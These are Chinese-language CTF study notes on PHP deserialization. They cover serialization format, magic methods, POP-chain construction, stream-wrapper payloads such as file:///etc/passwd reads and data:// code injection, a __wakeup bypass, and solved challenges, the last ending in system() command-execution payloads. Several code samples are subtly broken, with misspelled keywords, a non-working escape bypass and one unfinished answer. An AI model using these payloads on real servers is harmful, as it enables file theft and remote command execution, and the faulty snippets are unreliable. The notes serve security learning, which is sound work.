# PHP反序列化漏洞

教程：

[《php反序列化漏洞教程》零基础教程_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1TH4y1U7tJ/?spm_id_from=333.337.search-card.all.click&vd_source=f264368eefdba6c9e52d63931d176453)

[CTF中的反序列化考点总结从0到1 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/395857.html)



## php访问修饰符

```
public 默认
```

| 可访问性 | public | protected | private |
| -------- | ------ | --------- | ------- |
| 类自身   | √      | √         | √       |
| 类外部   | √      | ×         | ×       |
| 子类     | √      | √         | ×       |



## 序列化

​	**序列化**：对象→串字节流or字符串

​	**反序列化**：序列化后数据→对象

```php
serialize()
// 序列化
    
unserialize()
// 反序列化
```

**对象序列化：**

```php
class people{
	public $name = 'lili';
    private $age = 18;
    protected $height = '156cm';
    public function speak(){
        echo 'hello';
    }
}

$lili = new people();
$a = serialize（&lili);
echo $a;

O:6:"people":3:{s:4:"name";s:4:"lili";s:11:"peopleage";i:18;s:9:"*height";s:5:"156cm";}
// 私有属性用peopleage表示，但其实是%00people%00age，所以大小就是11,0x00类名0x00成员名
// 受保护属性同理，为 %00*%00height=>%00%2A%00height，0x000x2A0x00成员名
// height同理
```

类的方法不会显示在序列化后的结果中，但事实上是包含在里面的。

s：字符串

i：整数

d：浮点数

a：数组

O：对象类型Object

N：Null类型

b：布尔值

|  数据类型  |     值     |        序列化的值        |
| :--------: | :--------: | :----------------------: |
| null 类型  |    null    |           `N;`           |
| 字符串类型 |  "hello"   |      `s:5:"hello";`      |
|    整型    |    666     |         `i:666`;         |
|   浮点型   |    2.0     |          `d:2;`          |
|  布尔类型  |    true    |          `b:1;`          |
| 布尔值类型 |   false    |          `b:0;`          |
|  数组类型  | array(6,7) | `a:2:{i:0;i:6;i:1;i:7;}` |



|         数据类型          | 序列化后的类型简称 |
| :-----------------------: | :----------------: |
|           array           |         a          |
|          boolean          |         b          |
|          double           |         d          |
|          integer          |         i          |
|       common object       |         o          |
|         reference         |         r          |
| non-escaped binary string |         s          |
|       custom object       |         C          |
|           class           |         O          |
|           null            |         N          |
|     pointer reference     |         P          |
|      unicode string       |         U          |







**数组序列化;**

```php
$arr=array('lili','girl');
echo serialize($arr);

a:2:{i:0;s:4:"lili";i:1;s:4:"girl";}
```

a:2表示有效值的数量，如果让array[8]=100，再进行序列化，则会显示a:3



## 反序列化



输出：

```php
print_r(unserialize($a));

// 输出结果;
// people Object([name]=>lili [age:people:private]=>18 [height:protected]=>156cm)

var_dump(unserialize($a));

// 输出结果:
// object(people)#2 (3){["name"]=>string(4) "lili" ["age":"people":private]=>int(18)["height":protected]=>string(5) "156cm"}
```



## 魔术方法

双下划线开头和结束命名的，在PHP中对象生命周期中自动调用，执行特定的操作。

- `__construct()` 类的构造函数，创建对象时进行初始化操作
- `__destruct()` 类的析构函数，在对象被销毁之前执行清理操作
- `__call()` 对象调用一个不可访问或不存在方法时调用
- `__callStatic()` 调用一个不存在或不可访问的静态方法
- `__get()` 访问一个对象的不可访问或者不存在属性时的调用
- `__set()` 对不可访问属性进行赋值时调用
- `__isset()` 对不可访问的属性调用`isset()` 或`empty()` 时调用
- `__unset()` 对不可访问的属性调用`unset()` 时调用
- `__sleep()` 执行`serialize()` 之前调用该函数
- `__wakeup()` 执行`unserialize()`后调用该函数
- `__toString()` 类被当成字符串时的回应方法，echo或者拼接字符串都会被触发
- `__invoke()` 将一个对象作为函数直接调用时的行为定义
- `__set_state()` 设置对`var_export()` 函数所产生的字符串的进行反序列化操作时的行为
- `__clone()` 当clone关键字复制一个对象时调用
- `__autoload()` 尝试加载未定义的类时调用
- `__debugInfo()` 打印所需调试信息

## pop链

 将多个链和方法串联在一起，链式调用

注意函数：`eval`  `include`

关注重点函数：

```
// 代码执行
eval()
assert()

// 命令执行
exec()
passthru()
popen()
system()
shell_exec()

// 文件操作
file_get_contents()
file_put_contents()
unlink()
show_source()
highlight_file()
...
```





```php
class test{
    private $index;
    function __construct(){
        $this->index=new execute();
    }
}

class execute{
    public $test="system('dir');";
}
$a=new test();
echo urenlcode(serialize($a));
```



## Pop链训练

### 1

案例：构造pop链

<img src="https://www.helloimg.com/i/2024/09/26/66f514d997258.png" alt="屏幕截图 2024-09-26 160729.png" style="zoom:200%;" />

```php
#!/usr/bin/php

<?php
    class Modifier{
        protected $var;
        public function append($value){
            include($value);
        }
        public funcion __invoke(){
            $this->append($this->var);
        }
    }

    class Show{
        public $source;
        public $str;
        public funcion __construct($file="index.php"){
            $this->source= $file;
            echo "Welcome to".$this->source."<br>";
        }
        public funcion __toString(){
            return $this->str->source;
        }
        public function __wakeup(){
            if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i",$this->source)){
                echo "hacker";
                $this->source = "index.php";
            }
        }
    }
    class Test{
        public $p;
        publicfuncion __construct(){
            $this->p=array();
        }
        public function __get($key){
            $function = $this->p;
            return $function();
        }
    }
    if(isset($_GET['pop'])){
        @unserialize($_GET['pop']);
    }
    else{
        $a = new Show;
        highlight_file(__FILE__);
    }
?>
```





观察函数，需要构造`$value=flag.php`

`append` 执行需要`__invoke()` 被触发，`Modifier`实例作为函数调用

`Modifier` 作为函数调用，需要`__get` 被触发且`$p=new Modifier()` ==> 进而触发`__invoke()`

访问Test对象不存在的属性：`toString()` 触发且`$str=new Test()` ==>进而触发`__get()`

`__wakeup()` 触发且`$source=new Show()` ==> 进而触发 `__toString()`



```php
class Modifier{
    protected $var="flag.php";
}
class Test{
    public $p;
}
class Show{
    public $source;
    public $str;
    
    public function __construct(){
        $this->str=new Test();
    }
}
$a=new Show();
$a->source=new Show();
$a->source->str->p=new Modifier();
echo urlencode(serialize($a));
```



### 2

题目：



```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```



构造思路：

```php
<?php
class Demo {
private $file = 'index.php';
//protected $file1 = 'index.php';
public function __construct($file) {
    $this->file = $file;
    //$this->file1 = $file1;
}
    
function __destruct() {
    echo @highlight_file($this->file, true);
}
    
function __wakeup() {
    if ($this->file != 'index.php') {
        //the secret is in the fl4g.php
        $this->file = 'index.php';
    }
}
    
}

$a = new Demo("fl4g.php");
echo serialize($a)."\n";
//O:4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
echo base64_encode('O:+4:"Demo":2:{s:10:" Demo file";s:8:"fl4g.php";}');
```

### 3

题目：

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}

```



解决：

```php
#!/usr/bin/php
<?php

    class FileHandler{
    	public $op=" 2";
    	public $filename="flag.php";
    	public $content="js";
    
}
	
	$flag = new FileHandler();
    echo serialize($flag);
    
?>
```



### 4

题目：

```php
#!/usr/bin/env php
<?php
Swoole\Runtime::enableCoroutine($flags = SWOOLE_HOOK_ALL);
$http = new Swoole\Http\Server("0.0.0.0", 80);
$http->on("request",
    function (Swoole\Http\Request $request, Swoole\Http\Response $response) {
        Swoole\Runtime::enableCoroutine();
        $response->header('Content-Type', 'text/plain');

        if (isset($request->get['phpinfo'])) {
            return $response->sendfile('phpinfo.txt');
        }
        
        if (isset($request->get['code'])) {
            try {
                $code = $request->get['code'];
                if (!preg_match('/\x00/', $code)) {
                    $a = unserialize($code);
                    $a();
                    $a = null;
                }
            } catch (\Throwable $e) {
                var_dump($code);
                var_dump($e->getMessage());
                // do nothing
            }
            return $response->end('Done');
        }
        
        $response->sendfile(__FILE__);
    }
);
$http->start();
```



答案：

```php
#!/usr/bin/php
<?php
	class code
?>
```



### 5

题目：

```php
<?php 
header("Content-Type: text/html;charset=utf-8");
error_reporting(0);

class Read {
    public function get_file($value) {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}

class Show {
    public $source;
    public $var;
    public $class1;

    public function __construct($name = 'index.php') {
        $this->source = $name;
        echo $this->source . "Welcome" . "<br />";
    }

    public function __toString() {
        $content = $this->class1->get_file($this->var);
        echo $content;
        return $content;
    }

    public function _show() {
        if (preg_match("/gopher|http|ftp|https|dict|\.\.|flag|file/i", $this->source)) {
            die("hacker");
        } else {
            highlight_file($this->source);
        }
    }

    public function Change() {
        if (preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
        }
    }

    public function __get($key) {
        $function = $this->$key;
        $this->{$key}();
    }
}

if (isset($_GET['sid'])) {
    $sid = $_GET['sid'];
    $config = unserialize($_GET['config']);
    $config->$sid;
} else {
    $show = new Show('index.php');
    $show->_show();
}
?>
```



思考流程

```php
<?php 
header("Content-Type: text/html;charset=utf-8");
error_reporting(0);

class Read {
    public function get_file($value) {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}

class Show {
    public $source;
    public $var;
    public $class1;


    public function __toString() {
        $content = $this->class1->get_file($this->var);
        echo $content;
        return $content;
    }

    public function _show() {
        if (preg_match("/gopher|http|ftp|https|dict|\.\.|flag|file/i", $this->source)) {
            die("hacker");
        } else {
            highlight_file($this->source);
        }
    }

    public function __get($key) {
        $function = $this->$key;
        $this->{$key}();
    }
}

if (isset($_GET['sid'])) {
    $sid = $_GET['sid'];
    $config = unserialize($_GET['config']);
    $config->$sid;
} else {
    $show = new Show('index.php');
    $show->_show();
}
?>
```

构造

```php
<?php 
    
class Read{
    
}
class Show {
    public $source;
    public $var;
    public $class1;
}

	$obj = new Read;
	$obj2 = new Show;
	$obj2->class1=$obj;
	$obj2->var='flag.php';
	echo urlencode(serialize($obj2));

?>
```



### 6



## 字符串逃逸



## Session反序列化



## phar反序列化



## 伪协议

| 伪协议  | 功能                |
| ------- | ------------------- |
| file:// | 访问本地文件系统    |
| http:// | 访问 HTTP(s) 网址   |
| php://  | 访问各个输入/输出流 |
| phar:// | PHP 归档            |
| zip://  | 压缩流              |



file://

读取本地的文件，

```
www.xxx.com/?file=file:///etc/passwd
```



php://input

```
www.xxx.xxx/?cmd=php://input
```



php://filter

```
www.xxx.xxx/?file=php://filter/read=covert,vase64-encode/resource=index.php
```



data://

```
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
```



dict://

```
192.168.0.0/?url=dict://192.168.0.0:6379
```



zip://

```
www.xxx.xxx/?file=zip:///php.zip#phpinfo.jpg
```



phar://

```
http://127.0.0.1/include.php?file=phar:///phpinfo.zip/phpinfo.txt
```



```
?file=php://filter/read=convert.base64-encode/resource=index.php
```

```
data://text/plain;编码格式,读取内容
```







## 反序列化绕过训练

### 1、滤过flag.php

```php
<?php 
class BUU {
    public $file = "index.php";
    public function __destruct() {
        if (isset($this->file) && !stripos('flag', $this->file))  {
            highlight_file($this->file);
        }
    }
}

if (isset($_GET['ser'])) {
    unserialize($_GET['ser']);
} else {
    $o = new BUU;
}
?>
```



答案

```php
<?php
    class BUU{
    public $file = "index.php";
}
	$obj = new BUU;
	$obj->file='flag.php';
// 绕过字符转十进制的ASCII码
	$obj->file='\66\6c\61\67\2e\70\68\70';
	echo serialize($obj);
?>
```



### 2、绕过__wakeup()

**CVE-2016-7124**: 当成员属性数目大于实际数目时可绕过`wakeup`方法的执行

PHP5: < 5.6.25
PHP7: < 7.0.10

如

```php
O:3:"BUU":1:{s:4:"file";s:8:"flag.php";}

// 改为

O:3:"BUU":2:{s:4:"file";s:8:"flag.php";}
```

这种方法也叫做**畸形序列化字符串**，畸形序列化字符串就是故意修改序列化数据，使其与标准序列化数据存在个别字符的差异，达到绕过一些安全函数的目的。



**畸形字符串的构造**:

- 改掉属性的个数
- 删除末尾的`}`





### 3、属性权限不敏感



## 题目



### 逆转思维

浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维

```php
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```



url get方法传三个参数，text，file，pwd

=== 值与类型相同

data数据流封装

```
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
```



包含useless.php文件，利用filter协议读取

```
file=php://filter/read=convert.base64-encode/resource=useless.php
```



读到内容

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```



看到toString方法



然后让Flag里面的file = flag.php 然后反序列化即可



然后上述三个payload&提交

```
/？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```





### AreUserialz

2020-网鼎杯-青龙组-Web-AreUSerialz



题目：

```php
 <?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}

```



题解

```php
#!/usr/bin/php
<?php

class FileHandler {

    public $op=" 2";
    public $filename="flag.php";
    public $content="";

}
	$a = new FileHandler;
	echo serialize($a);
?>
```

重点 " 2"绕过=== 和 ==





### pklovecloud

2021-第五空间智能安全大赛-Web-pklovecloud

题目

```php
 <?php  
include 'flag.php';
class pkshow 
{  
    function echo_name()     
    {          
        return "Pk very safe^.^";      
    }  
} 

class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new pkshow;
    }  
    function __toString()      
    {          
        if (isset($this->cinder))  
            return $this->cinder->echo_name();      
    }  
}  

class ace
{    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    {   
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
        $file = "./{$this->filename}";
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }  
}  

if (isset($_GET['pks']))  
{
    $logData = unserialize($_GET['pks']);
    echo $logData; 
} 
else 
{ 
    highlight_file(__file__); 
}
?> 
```



题解

```php
#!/usr/bin/php
<?php  

class acp 
{   
    public $cinder;  
    public $neutron;
    public $nova;
}  

class ace
{    
    public $filename="flag.php";     
    public $openstack;
    public $docker=''; 
    
}  
	$ace = new ace;
	$password = new acp;
	$password->cinder=$ace;
	echo serialize($password);
?> 
```



### phpweb

2020-网鼎杯-朱雀组-Web-phpweb

题目

```html
<!DOCTYPE html>
<html>
<head>
  <title>phpweb</title>
  <style type="text/css">
		body {
			background:url("bg.jpg") no-repeat;
			background-size: 100%;
      }
    p {
      color: white;
    }
	</style>
</head>
<body>
  <script language=javascript>
    setTimeout("document.form1.submit()",5000)
  </script>
  <p>
  2024-09-28 02:58:57 am  </p>
  <form id=form1 name=form1 action="index.php" method="post">
    <input type="hidden" id="func" name="func" value='date'>
    <input type="hidden" id="p" name="p" value='Y-m-d h:i:s a'>
  </form>
</body>
</html>

```



BP抓包

```bp
POST /index.php HTTP/1.1

Host: challenge-ef74ab107ab5ae73.sandbox.ctfhub.com:10800

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 29

Origin: http://challenge-ef74ab107ab5ae73.sandbox.ctfhub.com:10800

Connection: close

Referer: http://challenge-ef74ab107ab5ae73.sandbox.ctfhub.com:10800/index.php

Upgrade-Insecure-Requests: 1



func=date&p=Y-m-d+h%3Ai%3As+a
```



```
func=highlight_file&p=index.php
```



得到源码

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch",
      "escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",
      "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce",
      "array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents"
    );
    function gettime($func, $p) {
      $result = call_user_func($func, $p);
      $a= gettype($result);
      if ($a == "string") {
        return $result;
      } else {
        return "";
      }
    }
    class Test {
      var $p = "Y-m-d h:i:s a";
      var $func = "date";
      function __destruct() {
        if ($this->func != "") {
          echo gettime($this->func, $this->p);
        }
      }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];
    if ($func != null) {
      $func = strtolower($func);
      if (!in_array($func,$disable_fun)) {
        echo gettime($func, $p);
      }else {
        die("Hacker...");
      }
    }
  ?>
```



```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";} 
```



```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:20:"cat /flag_1687718407";s:4:"func";s:6:"system";} 
```



得到flag

